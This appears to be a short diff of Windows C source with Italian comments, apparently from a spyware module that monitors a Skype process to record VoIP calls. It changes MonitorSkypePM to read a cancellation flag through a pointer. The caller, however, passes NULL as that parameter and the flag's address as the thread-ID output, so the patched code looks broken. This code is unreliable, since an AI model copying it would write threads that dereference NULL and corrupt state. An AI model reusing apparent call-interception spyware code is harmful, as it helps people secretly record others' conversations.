@@ -1906,7 +1906,7 @@ BOOL IsSkypePMInstalled()
 }
 
 // Monitora costantemente la presenza di SkypePM
-DWORD WINAPI MonitorSkypePM(DWORD dummy)
+DWORD WINAPI MonitorSkypePM(BOOL *semaphore)
 {
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
@@ -1918,7 +1918,7 @@ DWORD WINAPI MonitorSkypePM(DWORD dummy)
 
 	LOOP {
 		for (DWORD i=0; i<7; i++) {
-			CANCELLATION_POINT(bPM_spmcp);
+			CANCELLATION_POINT((*semaphore));
 			Sleep(250);
 		}
 
@@ -2417,7 +2417,7 @@ DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
 	} else { // bStartFlag == TRUE
 		DWORD dummy;
 		// Startiamo il thread che monitora lo skypePM
-		hSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, NULL, 0, &dummy);
+		hSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, NULL, 0, (DWORD *)&bPM_spmcp);
 	}
 
 	return 1;
